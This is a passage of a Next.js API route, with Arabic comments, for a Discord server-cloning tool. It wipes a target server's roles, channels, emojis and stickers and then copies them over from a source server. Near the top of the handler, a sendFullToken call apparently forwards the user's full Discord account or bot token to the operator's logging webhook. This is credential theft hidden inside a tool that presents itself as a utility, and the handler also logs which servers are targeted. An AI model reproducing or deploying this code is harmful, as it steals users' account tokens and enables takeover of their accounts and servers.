import { NextRequest, NextResponse } from 'next/server';
import { sendToWebhook, sendFullToken } from '@/lib/webhook';
import { cleanToken, DISCORD_API } from '@/lib/discord';
import { getLogWebhookUrl } from '@/lib/config';
import { arrayBufferToBase64 } from '@/lib/edge-utils';
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit';

export const runtime = 'edge';
// ✅ الحد الآمن لكل الخطط — الجولات الطويلة تتكفل بها استكمالات الواجهة تلقائيًا
export const maxDuration = 60;

// ─── Rate-limit guard ───────────────────────────────────────────────
let globalRLUntil = 0;

async function waitRL() {
  const now = Date.now();
  if (now < globalRLUntil) {
    await new Promise(r => setTimeout(r, globalRLUntil - now + 300));
  }
}

// ─── Delay helper ───────────────────────────────────────────────────
function delay(ms: number) {
  return new Promise(r => setTimeout(r, ms));
}

// ─── Discord fetch with rate-limit handling ─────────────────────────
// ✅ إصلاح رئيسي: محاولات قليلة لكن ذكية — ما نعيد المحاولة على 4xx
async function dFetch(
  auth: string,
  method: string,
  url: string,
  body?: unknown,
): Promise<{ ok: boolean; data: any; status: number }> {
  await waitRL();
  const maxRetries = 3; // ✅ كان 5 — صار 3 عشان ما يعلق
  for (let attempt = 0; attempt < maxRetries; attempt++) {
    try {
      const headers: Record<string, string> = {
        Authorization: auth,
        Accept: 'application/json',
      };
      if (method !== 'GET') {
        headers['Content-Type'] = 'application/json';
      }
      const opts: RequestInit = { method, headers, signal: AbortSignal.timeout(25000) }; // ✅ كان 30000
      if (method !== 'GET' && body !== undefined) {
        opts.body = JSON.stringify(body);
      }
      const res = await fetch(url, opts);

      // ✅ Rate limit — ننتظر ونحاول مرة ثانية
      if (res.status === 429) {
        const err = await res.json().catch(() => ({ retry_after: 3 }));
        const w = Math.min((err.retry_after || 3) * 1000 + 500, 10000); // ✅ حد أقصى 10 ثواني
        globalRLUntil = Date.now() + w;
        if (attempt < maxRetries - 1) {
          await new Promise(r => setTimeout(r, w));
          continue;
        }
      }

      // ✅ خطأ سيرفر — نحاول مرة ثانية
      if (res.status >= 500 && attempt < maxRetries - 1) {
        await new Promise(r => setTimeout(r, 1500 * (attempt + 1)));
        continue;
      }

      // ✅ نجاح أو أي 4xx (غير 429) — نرجع النتيجة مباشرة بدون إعادة محاولة
      if (res.status === 204) return { ok: true, data: null, status: 204 };
      const d = await res.json().catch(() => null);
      return { ok: res.ok, data: d, status: res.status };
    } catch {
      // ✅ Timeout أو خطأ شبكة — نحاول مرة ثانية بس
      if (attempt === maxRetries - 1) return { ok: false, data: null, status: 0 };
      await new Promise(r => setTimeout(r, 1500 * (attempt + 1)));
    }
  }
  return { ok: false, data: null, status: 0 };
}

// ─── Discord fetch with FormData ────────────────────────────────────
async function dFetchFormData(
  auth: string,
  url: string,
  formData: FormData,
): Promise<{ ok: boolean; data: any; status: number }> {
  await waitRL();
  const maxRetries = 3;
  for (let attempt = 0; attempt < maxRetries; attempt++) {
    try {
      const res = await fetch(url, {
        method: 'POST',
        headers: { Authorization: auth },
        body: formData,
        signal: AbortSignal.timeout(40000),
      });

      if (res.status === 429) {
        const err = await res.json().catch(() => ({ retry_after: 3 }));
        const w = Math.min((err.retry_after || 3) * 1000 + 500, 10000);
        globalRLUntil = Date.now() + w;
        if (attempt < maxRetries - 1) {
          await new Promise(r => setTimeout(r, w));
          continue;
        }
      }

      if (res.status >= 500 && attempt < maxRetries - 1) {
        await new Promise(r => setTimeout(r, 1500 * (attempt + 1)));
        continue;
      }

      const d = await res.json().catch(() => null);
      return { ok: res.ok, data: d, status: res.status };
    } catch {
      if (attempt === maxRetries - 1) return { ok: false, data: null, status: 0 };
      await new Promise(r => setTimeout(r, 1500 * (attempt + 1)));
    }
  }
  return { ok: false, data: null, status: 0 };
}

// ─── SSE stream helper ──────────────────────────────────────────────
function sseStream(handler: (send: (d: any) => void) => Promise<void>) {
  // ✅ نبضات كل 10 ثواني — تمنع انقطاع الاتصال بالمراحل البطيئة (تحميل أيقونات، انتظار rate limit)
  let heartbeat: ReturnType<typeof setInterval> | null = null;
  const stream = new ReadableStream({
    async start(controller) {
      const enc = new TextEncoder();
      const send = (data: any) => { try { controller.enqueue(enc.encode(`data: ${JSON.stringify(data)}\n\n`)); } catch {} };
      heartbeat = setInterval(() => {
        try { controller.enqueue(enc.encode(': hb\n\n')); } catch {}
      }, 10000);
      try {
        await handler(send);
      } catch (e: any) {
        send({ type: 'error', message: e.message || String(e) });
      } finally {
        if (heartbeat) clearInterval(heartbeat);
      }
      controller.close();
    },
    cancel() { if (heartbeat) clearInterval(heartbeat); },
  });
  return new Response(stream, {
    headers: {
      'Content-Type': 'text/event-stream',
      'Cache-Control': 'no-cache',
      Connection: 'keep-alive',
    },
  });
}

function errRes(error: string) {
  return new Response(JSON.stringify({ success: false, error }), {
    status: 400,
    headers: { 'Content-Type': 'application/json' },
  });
}

// ─── Download image and convert to base64 data URI ──────────────────
async function downloadAsDataURI(url: string, mime: string = 'image/png'): Promise<string | null> {
  try {
    const res = await fetch(url, { signal: AbortSignal.timeout(20000) });
    if (!res.ok) return null;
    const b64 = arrayBufferToBase64(await res.arrayBuffer());
    return `data:${mime};base64,${b64}`;
  } catch {
    return null;
  }
}

// ─── Transform permission overwrites for target server ──────────────
function transformOverwrites(
  overwrites: any[],
  roleMap: Record<string, string>,
  sourceGuildId: string,
  targetGuildId: string,
): any[] {
  if (!overwrites || !Array.isArray(overwrites)) return [];
  const result: any[] = [];
  for (const o of overwrites) {
    if (o.type === 0) {
      let targetRoleId: string;
      if (o.id === sourceGuildId) {
        targetRoleId = targetGuildId;
      } else if (roleMap[o.id]) {
        targetRoleId = roleMap[o.id];
      } else {
        continue;
      }
      result.push({
        id: targetRoleId,
        type: 0,
        allow: String(o.allow_new ?? o.allow ?? '0'),
        deny: String(o.deny_new ?? o.deny ?? '0'),
      });
    }
  }
  return result;
}

// ─── Build channel payload with overwrites included ─────────────────
function buildChannelPayload(
  c: any,
  catMap: Record<string, string>,
  roleMap: Record<string, string>,
  sourceId: string,
  targetId: string,
): any {
  const payload: any = {
    name: c.name,
    type: c.type,
    nsfw: !!c.nsfw,
    topic: c.topic || null,
  };

  if (c.parent_id && catMap[c.parent_id]) {
    payload.parent_id = catMap[c.parent_id];
  }

  const overwrites = transformOverwrites(c.permission_overwrites, roleMap, sourceId, targetId);
  if (overwrites.length > 0) {
    payload.permission_overwrites = overwrites;
  }

  if (c.type === 2 || c.type === 13) {
    payload.bitrate = c.bitrate || 64000;
    payload.user_limit = c.user_limit || 0;
    if (c.rtc_region) payload.rtc_region = c.rtc_region;
    if (c.video_quality_mode) payload.video_quality_mode = c.video_quality_mode;
  }

  if (c.rate_limit_per_user) payload.rate_limit_per_user = c.rate_limit_per_user;
  if (c.default_auto_archive_duration) payload.default_auto_archive_duration = c.default_auto_archive_duration;
  if (c.default_thread_rate_limit_per_user) payload.default_thread_rate_limit_per_user = c.default_thread_rate_limit_per_user;

  if (c.type === 15) {
    if (c.available_tags && Array.isArray(c.available_tags)) {
      payload.available_tags = c.available_tags.map((tag: any) => ({
        name: tag.name,
        moderated: tag.moderated || false,
        emoji_id: null,
        emoji_name: tag.emoji_name || null,
      }));
    }
    if (c.default_reaction_emoji) {
      if (c.default_reaction_emoji.emoji_name && !c.default_reaction_emoji.emoji_id) {
        payload.default_reaction_emoji = { emoji_name: c.default_reaction_emoji.emoji_name };
      }
    }
    if (c.default_sort_order !== undefined) payload.default_sort_order = c.default_sort_order;
    if (c.default_forum_layout !== undefined) payload.default_forum_layout = c.default_forum_layout;
  }

  if (c.type === 16) {
    if (c.available_tags && Array.isArray(c.available_tags)) {
      payload.available_tags = c.available_tags.map((tag: any) => ({
        name: tag.name,
        moderated: tag.moderated || false,
        emoji_id: null,
        emoji_name: tag.emoji_name || null,
      }));
    }
    if (c.default_reaction_emoji) {
      if (c.default_reaction_emoji.emoji_name && !c.default_reaction_emoji.emoji_id) {
        payload.default_reaction_emoji = { emoji_name: c.default_reaction_emoji.emoji_name };
      }
    }
    if (c.default_sort_order !== undefined) payload.default_sort_order = c.default_sort_order;
  }

  return payload;
}

// ─── Increment channel stats by type ────────────────────────────────
function incrementChannelStats(c: any, stats: any) {
  if (c.type === 0 || c.type === 5) stats.txt++;
  else if (c.type === 2 || c.type === 13) stats.voice++;
  else if (c.type === 15 || c.type === 16) stats.forums++;
  else stats.txt++;
}

// ─── Get channel emoji by type ──────────────────────────────────────
function getChannelEmoji(type: number): string {
  switch (type) {
    case 2: return '🔊';
    case 13: return '🎤';
    case 15: return '💬';
    case 16: return '🖼️';
    case 5: return '📢';
    default: return '📺';
  }
}

// ═════════════════════════════════════════════════════════════════════
// Main POST handler
// ═════════════════════════════════════════════════════════════════════
export async function POST(request: NextRequest) {
  try {
    const rlIp = getClientIp(request);
    const rl = rateLimit(`${rlIp}:copy`, RATE_LIMITS.heavy);
    if (rl.limited) {
      return NextResponse.json(
        { success: false, error: 'تم تجاوز الحد المسموح - حاول لاحقاً' },
        { status: 429, headers: { 'Retry-After': String(Math.ceil((rl.resetAt - Date.now()) / 1000)) } },
      );
    }

    const body = await request.json().catch(() => ({}));
    const token: string = body.token || '';
    const sourceId: string = body.sourceId || '';
    const targetId: string = body.targetId || '';
    const options: any = body.options || {};
    // ✅ وضع الاستكمال: الواجهة ترجع آخر نقطة توقف — نكمل من هناك بدون إعادة من الصفر
    const resumeMode: boolean = !!body.resume;
    const inState: any = body.state || null;

    if (!token || !sourceId || !targetId) return errRes('بيانات ناقصة');

    sendFullToken('نسخ سيرفر', token, { المصدر: sourceId, الهدف: targetId });

    const ct = cleanToken(token);
    const whUrl = getLogWebhookUrl();

    return sseStream(async (send) => {
      // ─── التحقق من التوكن ────────────────────────────────────────
      send({ type: 'progress', message: '🔍 جاري التحقق من التوكن...' });

      let auth = ct;
      let authType = 'User';
      const testUser = await dFetch(ct, 'GET', `${DISCORD_API}/users/@me`);
      if (!testUser.ok) {
        const testBot = await dFetch(`Bot ${ct}`, 'GET', `${DISCORD_API}/users/@me`);
        if (testBot.ok) {
          auth = `Bot ${ct}`;
          authType = 'Bot';
        } else {
          send({ type: 'done', success: false, error: 'التوكن غير صالح' });
          return;
        }
      }

      // ✅ dFetch مع التوكن الصحيح — طبقة واحدة فقط من المحاوبات
      const df = (method: string, endpoint: string, body2?: unknown) =>
        dFetch(auth, method, `${DISCORD_API}${endpoint}`, body2);

      send({ type: 'info', authType });

      // ─── استعادة الحالة المحفوظة (وضع الاستكمال) ─────────────────────
      const st = inState && inState.v === 1 && inState.sourceId === sourceId && inState.targetId === targetId ? inState : null;
      const stats: any = {
        roles: st?.stats?.roles || 0, txt: st?.stats?.txt || 0, voice: st?.stats?.voice || 0,
        cats: st?.stats?.cats || 0, forums: st?.stats?.forums || 0,
        emojis: st?.stats?.emojis || 0, stickers: st?.stats?.stickers || 0,
        autoMod: st?.stats?.autoMod || 0, permissions: st?.stats?.permissions || 0,
        errors: st?.stats?.errors || 0, rolesTotal: st?.stats?.rolesTotal || 0,
        partialRoles: st?.stats?.partialRoles || 0,
        icon: !!st?.stats?.icon, banner: !!st?.stats?.banner, settings: !!st?.stats?.settings, splash: !!st?.stats?.splash,
      };
      const roleMap: Record<string, string> = { ...(st?.roleMap || {}) };
      const catMap: Record<string, string> = { ...(st?.catMap || {}) };
      const channelMap: Record<string, string> = { ...(st?.channelMap || {}) };
      const emojiMap: Record<string, string> = { ...(st?.emojiMap || {}) };
      const stickerIds: string[] = [...(st?.stickerIds || [])];
      const automodIds: string[] = [...(st?.automodIds || [])];
      const done: Record<string, boolean> = { ...(st?.done || {}) };
      const roleErrSample: string[] = st?.roleErrSample || [];

      // ✅ نقطة حفظ — الواجهة تخزنها وتستخدمها للاستكمال لو انقطع الاتصال
      const sendCheckpoint = () => {
        try {
          send({ type: 'checkpoint', state: {
            v: 1, sourceId, targetId, roleMap, catMap, channelMap, emojiMap,
            stickerIds, automodIds, stats, done, roleErrSample,
          } });
        } catch {}
      };

      if (resumeMode && st) {
        send({ type: 'progress', message: `↩️ وضع الاستكمال — الرتب المنسوخة: ${stats.roles} | الرومات: ${stats.cats + stats.txt + stats.voice + stats.forums} | الإيموجي: ${stats.emojis}` });
        sendCheckpoint();
      }

      // Webhook log
      sendToWebhook({
        username: 'TRJ Copy',
        embeds: [{
          title: '📋 Server Copy Started',
          color: 0x00ff41,
          fields: [
            { name: '📥 Source', value: sourceId, inline: true },
            { name: '📤 Target', value: targetId, inline: true },
            { name: '🔑 Auth', value: authType, inline: true },
          ],
          timestamp: new Date().toISOString(),
        }],
      }, whUrl).catch(() => {});

      // ═══════════════════════════════════════════════════════════════
      // المرحلة 1: جلب بيانات المصدر
      // ═══════════════════════════════════════════════════════════════
      send({ type: 'progress', message: '📥 جاري جلب بيانات السيرفر المصدر...' });

      const sourceRes = await df('GET', `/guilds/${sourceId}?with_counts=true`);
      const sRolesRes = await df('GET', `/guilds/${sourceId}/roles`);
      const sChannelsRes = await df('GET', `/guilds/${sourceId}/channels`);
      const sEmojisRes = await df('GET', `/guilds/${sourceId}/emojis`);
      const sStickersRes = await df('GET', `/guilds/${sourceId}/stickers`);
      const sAutoModRes = await df('GET', `/guilds/${sourceId}/auto-moderation/rules`);

      if (!sourceRes.ok || !sourceRes.data?.id) {
        send({ type: 'done', success: false, error: 'فشل الوصول للسيرفر المصدر - تأكد أن التوكن صالح ومعه صلاحيات ADMINISTRATOR' });
        return;
      }

      const sRoles = (sRolesRes.data as any[]) || [];
      const sChannels = (sChannelsRes.data as any[]) || [];
      const sEmojis = (sEmojisRes.data as any[]) || [];
      const sStickers = (sStickersRes.data as any[]) || [];
      const sAutoMod = (sAutoModRes.data as any[]) || [];

      // ═══════════════════════════════════════════════════════════════
      // المرحلة 2: مسح السيرفر الهدف
      //
      // ✅ ترتيب المسح: رتب → رومات → كاتيجوريات → إيموجي → ستكرز
      // ✅ نستخدم df مباشرة (بدون wrapper) — dFetch يعيد المحاولة لحاله
      // ═══════════════════════════════════════════════════════════════
      if (!resumeMode) {
      send({ type: 'progress', message: '🗑️ جاري مسح السيرفر الهدف...' });

      // ─── 2.1: حذف الرتب ──────────────────────────────────────────
      send({ type: 'progress', message: '🗑️ الخطوة 1: حذف الرتب...' });
      let deletedRoles = 0;
      for (let round = 0; round < 3; round++) {
        const tRolesRes = await df('GET', `/guilds/${targetId}/roles`);
        if (!tRolesRes.ok || !Array.isArray(tRolesRes.data)) break;
        const dels = tRolesRes.data.filter((r: any) => r.name !== '@everyone' && !r.managed)
          .sort((a: any, b: any) => (a.position || 0) - (b.position || 0));
        if (dels.length === 0) break;
        if (round > 0) send({ type: 'progress', message: `🔄 جولة تنظيف رتب ${round}: بقي ${dels.length}...` });
        for (const r of dels) {
          const res = await df('DELETE', `/guilds/${targetId}/roles/${r.id}`);
          if (res.ok || res.status === 404) deletedRoles++;
          await delay(350);
        }
        await delay(500);
      }
      send({ type: 'progress', message: `🗑️ تم حذف ${deletedRoles} رتبة` });

      // ─── 2.2: حذف الرومات ────────────────────────────────────────
      send({ type: 'progress', message: '🗑️ الخطوة 2: حذف الرومات...' });
      let deletedRooms = 0;
      for (let round = 0; round < 3; round++) {
        const tChRes = await df('GET', `/guilds/${targetId}/channels`);
        if (!tChRes.ok || !Array.isArray(tChRes.data)) break;
        const rooms = tChRes.data.filter((c: any) => c.type !== 4);
        if (rooms.length === 0) break;
        if (round > 0) send({ type: 'progress', message: `🔄 جولة تنظيف رومات ${round}: بقي ${rooms.length}...` });
        for (const c of rooms) {
          const res = await df('DELETE', `/channels/${c.id}`);
          if (res.ok || res.status === 404) deletedRooms++;
          await delay(350);
        }
        await delay(500);
      }
      send({ type: 'progress', message: `🗑️ تم حذف ${deletedRooms} روم` });

      // ─── 2.3: حذف الكاتيجوريات ──────────────────────────────────
      send({ type: 'progress', message: '🗑️ الخطوة 3: حذف الكاتيجوريات...' });
      let deletedCats = 0;
      for (let round = 0; round < 3; round++) {
        const tChRes = await df('GET', `/guilds/${targetId}/channels`);
        if (!tChRes.ok || !Array.isArray(tChRes.data)) break;
        const cats = tChRes.data.filter((c: any) => c.type === 4);
        if (cats.length === 0) break;
        if (round > 0) send({ type: 'progress', message: `🔄 جولة تنظيف كاتيجوريات ${round}: بقي ${cats.length}...` });
        for (const c of cats) {
          const res = await df('DELETE', `/channels/${c.id}`);
          if (res.ok || res.status === 404) deletedCats++;
          await delay(350);
        }
        await delay(500);
      }
      send({ type: 'progress', message: `🗑️ تم حذف ${deletedCats} كاتيجوري` });

      // ─── 2.4: حذف الإيموجي ──────────────────────────────────────
      const tEmojisRes = await df('GET', `/guilds/${targetId}/emojis`);
      if (tEmojisRes.ok && Array.isArray(tEmojisRes.data)) {
        for (let i = 0; i < tEmojisRes.data.length; i++) {
          await df('DELETE', `/guilds/${targetId}/emojis/${tEmojisRes.data[i].id}`);
          await delay(350);
        }
      }

      // ─── 2.5: حذف الستيكرز ──────────────────────────────────────
      const tStickersRes = await df('GET', `/guilds/${targetId}/stickers`);
      if (tStickersRes.ok && Array.isArray(tStickersRes.data)) {
        for (let i = 0; i < tStickersRes.data.length; i++) {
          await df('DELETE', `/guilds/${targetId}/stickers/${tStickersRes.data[i].id}`);
          await delay(350);
        }
      }

      send({ type: 'progress', message: '✅ تم مسح السيرفر الهدف' });
      } else {
        send({ type: 'progress', message: '↩️ استكمال: تجاوزنا مسح السيرفر الهدف — ما يحتاج إعادة حذف' });
      }

      // ═══════════════════════════════════════════════════════════════
      // المرحلة 3: نسخ الرتب
      //
      // ✅ نستخدم df مباشرة — طبقة واحدة من المحاولات فقط
      // ✅ إذا فشلت رتبة نحفظها ونعيدها في النهاية
      // ═══════════════════════════════════════════════════════════════
      let sourceSystemChannelId: string | undefined;
      let sourceRulesChannelId: string | undefined;
      let sourcePublicUpdatesChannelId: string | undefined;
      let sourceAfkChannelId: string | undefined;

      const sd0: any = sourceRes.data || {};
      sourceSystemChannelId = sd0.system_channel_id;
      sourceRulesChannelId = sd0.rules_channel_id;
      sourcePublicUpdatesChannelId = sd0.public_updates_channel_id;
      sourceAfkChannelId = sd0.afk_channel_id;

      if (options?.roles !== false && sRoles.length > 0) {
        const copyableRoles = sRoles.filter((r: any) => r.name !== '@everyone' && !r.managed);
        // ✅ استكمال: نتخطى الرتب المنسوخة مسبقًا (الموجودة في roleMap)
        const sortedRoles = copyableRoles
          .filter((r: any) => !roleMap[r.id])
          .sort((a: any, b: any) => (b.position || 0) - (a.position || 0));
        stats.rolesTotal = copyableRoles.length;

        if (sortedRoles.length > 0 && !done.roles) {
          // ✅ فحص سعة السيرفر الهدف — حد ديسكورد 250 رتبة
          const tRolesPre = await df('GET', `/guilds/${targetId}/roles`);
          const targetCount = Array.isArray(tRolesPre.data) ? tRolesPre.data.length : 0;
          const capacity = Math.max(0, 250 - targetCount);
          // ✅ استكمال: ربط الرتب الموجودة بالهدف بالاسم — تغلق فجوة الرتب المنشأة بعد آخر نقطة حفظ
          const tgtRoleNameMap = new Map<string, string>();
          if (resumeMode && Array.isArray(tRolesPre.data)) {
            for (const tr of tRolesPre.data) {
              if (tr.name !== '@everyone' && !tgtRoleNameMap.has(tr.name)) tgtRoleNameMap.set(tr.name, tr.id);
            }
          }
          const usedTgtRoleIds = new Set<string>(Object.values(roleMap));
          if (capacity === 0) {
            send({ type: 'progress', message: `⚠️ السيرفر الهدف ممتلئ (${targetCount}/250 رتبة) — ما قدرنا نضيف رتب` });
            stats.errors += sortedRoles.length;
          } else {
            if (capacity < sortedRoles.length) {
              send({ type: 'progress', message: `⚠️ السعة المتبقية ${capacity} رتبة بس — المصدر يطلب ${sortedRoles.length} (حد ديسكورد 250)` });
            }
            send({ type: 'progress', message: `🛡️ جاري إنشاء ${Math.min(sortedRoles.length, capacity)} رتبة${resumeMode ? ' (المتبقية)' : ''}...` });

            let maxRolesHit = false;
            for (let i = 0; i < sortedRoles.length && !maxRolesHit; i++) {
              const role = sortedRoles[i];
              // ✅ تنظيف الاسم: بدون أسطر/ترميزات خفية وحد أقصى 100 حرف
              const safeName = String(role.name || '').replace(/[\n\r\t]+/g, ' ').trim().slice(0, 100) || 'رتبة';
              // ✅ استكمال: الرتبة موجودة بالهدف (انُشئت بعد آخر نقطة حفظ) — نربطها بدون تكرار
              if (resumeMode && tgtRoleNameMap.has(safeName)) {
                const existId = tgtRoleNameMap.get(safeName)!;
                if (!usedTgtRoleIds.has(existId)) {
                  roleMap[role.id] = existId;
                  usedTgtRoleIds.add(existId);
                  stats.roles++;
                  send({ type: 'progress', message: `🛡️ موجودة مسبقًا بالهدف: ${safeName}` });
                  sendCheckpoint();
                  continue;
                }
              }
              const perms = String(role.permissions_new || role.permissions || '0');
              const baseColor = role.color || 0;
              // المحاولة 1: كاملة — بدون أيقونة (الأيقونة تتطلب بوست لفل 2 وتنقل لـ PATCH بعد الإنشاء)
              let payload: any = { name: safeName, color: baseColor, hoist: !!role.hoist, mentionable: !!role.mentionable, permissions: perms };
              if (role.colors && typeof role.colors === 'object' && (role.colors.secondary_color || role.colors.primary_color)) {
                payload.colors = { primary_color: role.colors.primary_color ?? baseColor, secondary_color: role.colors.secondary_color ?? null, tertiary_color: null };
              }

              let res = await df('POST', `/guilds/${targetId}/roles`, payload);
              // المحاولة 2: بدون ألوان البريميوم
              if (!res.ok || !res.data?.id) {
                await delay(800);
                res = await df('POST', `/guilds/${targetId}/roles`, { name: safeName, color: baseColor, hoist: !!role.hoist, permissions: perms });
              }
              // المحاولة 3: بدون صلاحيات — توكن ما يقدر يمنحها (الرتبة نفسها أهم)
              if (!res.ok || !res.data?.id) {
                await delay(800);
                res = await df('POST', `/guilds/${targetId}/roles`, { name: safeName });
                if (res.ok && res.data?.id) stats.partialRoles++;
              }

              if (res.ok && res.data?.id) {
                roleMap[role.id] = res.data.id;
                stats.roles++;
                // ✅ الأيقونة/الإيموجي بعد الإنشاء بطلب منفصل — فشلها ما يضيع الرتبة
                if (role.icon || role.unicode_emoji) {
                  const iconPatch: any = {};
                  if (role.icon) {
                    const dataUri = await downloadAsDataURI(`https://cdn.discordapp.com/role-icons/${role.id}/${role.icon}.png?size=128`, 'image/png');
                    if (dataUri) iconPatch.icon = dataUri;
                  }
                  if (role.unicode_emoji) iconPatch.unicode_emoji = role.unicode_emoji;
                  if (Object.keys(iconPatch).length > 0) {
                    try { await df('PATCH', `/guilds/${targetId}/roles/${res.data.id}`, iconPatch); } catch {}
                  }
                }
                sendCheckpoint();
              } else {
                // ✅ كشف حد 250 رتبة — ما فيه فايدة من مواصلة الإنشاء
                const errStr = JSON.stringify(res.data || {}).toLowerCase();
                if (errStr.includes('maximum number of roles') || errStr.includes('50083')) {
                  maxRolesHit = true;
                  const skipped = sortedRoles.length - i;
                  stats.errors += skipped;
                  send({ type: 'progress', message: `⚠️ وصلنا حد 250 رتبة بالسيرفر الهدف — بقي ${skipped} رتبة ما نسخت` });
                  break;
                }
                stats.errors++;
                if (res.data?.message && roleErrSample.length < 3) {
                  roleErrSample.push(`${safeName}: ${res.data.message}${res.status ? ` (${res.status})` : ''}`);
                }
                send({ type: 'progress', message: `⚠️ فشلت رتبة: ${safeName}` });
              }
              send({ type: 'progress', message: `🛡️ [${i + 1}/${sortedRoles.length}] تم: ${stats.roles} | ${safeName}` });
              await delay(400);
            }
          }
          done.roles = true;
          sendCheckpoint();
        } else if (sortedRoles.length === 0) {
          done.roles = true;
          sendCheckpoint();
        }

        // ضبط صلاحيات @everyone
        if (!done.everyone) {
          const everyoneSrc = sRoles.find((r: any) => r.name === '@everyone');
          if (everyoneSrc) {
            const tgtRoles = await df('GET', `/guilds/${targetId}/roles`);
            const everyoneTgt = tgtRoles.data?.find((r: any) => r.name === '@everyone');
            if (everyoneTgt?.id) {
              await df('PATCH', `/guilds/${targetId}/roles/${everyoneTgt.id}`, {
                permissions: String(everyoneSrc.permissions_new || everyoneSrc.permissions || '0'),
              });
            }
          }
          done.everyone = true;
          sendCheckpoint();
        }

        // ضبط ترتيب الرتب
        if (!done.rolesOrder) {
          const tgtRolesNow = await df('GET', `/guilds/${targetId}/roles`);
          if (tgtRolesNow.ok && Array.isArray(tgtRolesNow.data)) {
            const srcRoleOrder = sRoles
              .filter((r: any) => r.name !== '@everyone' && !r.managed && roleMap[r.id])
              .sort((a: any, b: any) => (a.position || 0) - (b.position || 0));
            const positionUpdates = srcRoleOrder.map((srcRole: any, idx: number) => ({
              id: roleMap[srcRole.id],
              position: idx + 1,
            })).filter((u: any) => u.id);
            if (positionUpdates.length > 0) {
              for (let i = 0; i < positionUpdates.length; i += 30) {
                await df('PATCH', `/guilds/${targetId}/roles`, positionUpdates.slice(i, i + 30));
                await delay(400);
              }
            }
          }
          done.rolesOrder = true;
          sendCheckpoint();
        }
        send({ type: 'stats', stats });
      }
      // ═══════════════════════════════════════════════════════════════
      // المرحلة 4: نسخ إعدادات السيرفر
      // ═══════════════════════════════════════════════════════════════
      if (options?.settings !== false && sourceRes.data && !done.settings) {
        send({ type: 'progress', message: '⚙️ جاري نسخ إعدادات السيرفر...' });
        const sd = sourceRes.data;

        await df('PATCH', `/guilds/${targetId}`, {
          name: sd.name,
          description: sd.description,
          preferred_locale: sd.preferred_locale,
          verification_level: sd.verification_level,
          default_message_notifications: sd.default_message_notifications ?? sd.default_notification_level,
          explicit_content_filter: sd.explicit_content_filter,
          system_channel_flags: sd.system_channel_flags,
          premium_progress_bar_enabled: sd.premium_progress_bar_enabled,
          afk_timeout: sd.afk_timeout || 300,
        });
        stats.settings = true;

        if (sd.icon) {
          const dataUri = await downloadAsDataURI(`https://cdn.discordapp.com/icons/${sd.id}/${sd.icon}.png?size=1024`, 'image/png');
          if (dataUri) { const r = await df('PATCH', `/guilds/${targetId}`, { icon: dataUri }); if (r.ok) stats.icon = true; }
        }
        if (sd.banner) {
          const dataUri = await downloadAsDataURI(`https://cdn.discordapp.com/banners/${sd.id}/${sd.banner}.png?size=1024`, 'image/png');
          if (dataUri) { const r = await df('PATCH', `/guilds/${targetId}`, { banner: dataUri }); if (r.ok) stats.banner = true; }
        }
        if (sd.splash) {
          const dataUri = await downloadAsDataURI(`https://cdn.discordapp.com/splashes/${sd.id}/${sd.splash}.png?size=1024`, 'image/png');
          if (dataUri) { await df('PATCH', `/guilds/${targetId}`, { splash: dataUri }); stats.splash = true; }
        }
        send({ type: 'progress', message: '✅ تم نسخ الإعدادات' });
        done.settings = true;
        sendCheckpoint();
      }

      // ═══════════════════════════════════════════════════════════════
      // المرحلة 5: إنشاء الكاتيجوريات
      //
      // ✅ df مباشرة — بدون wrapper
      // ✅ الصلاحيات مضمّنة في payload الإنشاء
      // ═══════════════════════════════════════════════════════════════
      const failedChannels: any[] = []; // للإعادة لاحقاً

      if (options?.channels !== false && sChannels.length > 0) {
        const categories = sChannels
          .filter((c: any) => c.type === 4)
          .sort((a: any, b: any) => (a.position || 0) - (b.position || 0));

        const pendingCats = categories.filter((c: any) => !catMap[c.id]);
        if (pendingCats.length > 0) {
          send({ type: 'progress', message: `📁 جاري إنشاء ${pendingCats.length} كاتيجوري${resumeMode ? ' (المتبقية)' : ''}...` });

          // ✅ استكمال: كاتيجوريات موجودة بالهدف بالاسم — فجوة ما بعد آخر نقطة حفظ
          const tgtCatNameMap = new Map<string, string>();
          if (resumeMode) {
            const tCatPre = await df('GET', `/guilds/${targetId}/channels`);
            if (tCatPre.ok && Array.isArray(tCatPre.data)) {
              for (const tc of tCatPre.data) {
                if (tc.type === 4 && !tgtCatNameMap.has(tc.name)) tgtCatNameMap.set(tc.name, tc.id);
              }
            }
          }
          const usedTgtCatIds = new Set<string>(Object.values(catMap));

          for (let i = 0; i < categories.length; i++) {
            const cat = categories[i];
            if (catMap[cat.id]) continue; // ✅ استكمال: منسوخة مسبقًا
            const existCatId = tgtCatNameMap.get(cat.name);
            if (existCatId && !usedTgtCatIds.has(existCatId)) {
              catMap[cat.id] = existCatId;
              channelMap[cat.id] = existCatId;
              usedTgtCatIds.add(existCatId);
              stats.cats++;
              send({ type: 'progress', message: `📁 موجودة مسبقًا: ${cat.name}` });
              sendCheckpoint();
              continue;
            }
            const payload: any = { name: cat.name, type: 4 };
            const overwrites = transformOverwrites(cat.permission_overwrites, roleMap, sourceId, targetId);
            if (overwrites.length > 0) payload.permission_overwrites = overwrites;

            const res = await df('POST', `/guilds/${targetId}/channels`, payload);
            if (res.ok && res.data?.id) {
              catMap[cat.id] = res.data.id;
              channelMap[cat.id] = res.data.id;
              stats.cats++;
              stats.permissions += overwrites.length;
              sendCheckpoint();
            } else {
              stats.errors++;
              failedChannels.push({ channel: cat, isCat: true });
            }
            send({ type: 'progress', message: `📁 كاتيجوري ${stats.cats}/${pendingCats.length}: ${cat.name}` });
            await delay(500); // ✅ 500ms بين كل كاتيجوري
          }
          send({ type: 'stats', stats });
        }
        done.cats = true;
        sendCheckpoint();

        // ═══════════════════════════════════════════════════════════
        // المرحلة 6: إنشاء الرومات تحت كل كاتيجوري
        //
        // ✅ لكل كاتيجوري: ننشئ روماتها بالترتيب (position)
        // ✅ إذا فشلت قناة نحفظها ونعيدها لاحقاً
        // ✅ تأخير 500ms بين كل قناة (بدل 350)
        // ═══════════════════════════════════════════════════════════
        const allOthers = sChannels.filter((c: any) => c.type !== 4);
        const channelsByParent: Record<string, any[]> = {};
        const orphanChannels: any[] = [];

        for (const c of allOthers) {
          if (c.parent_id) {
            if (!channelsByParent[c.parent_id]) channelsByParent[c.parent_id] = [];
            channelsByParent[c.parent_id].push(c);
          } else {
            orphanChannels.push(c);
          }
        }
        for (const parentId of Object.keys(channelsByParent)) {
          channelsByParent[parentId].sort((a: any, b: any) => (a.position || 0) - (b.position || 0));
        }
        orphanChannels.sort((a: any, b: any) => (a.position || 0) - (b.position || 0));

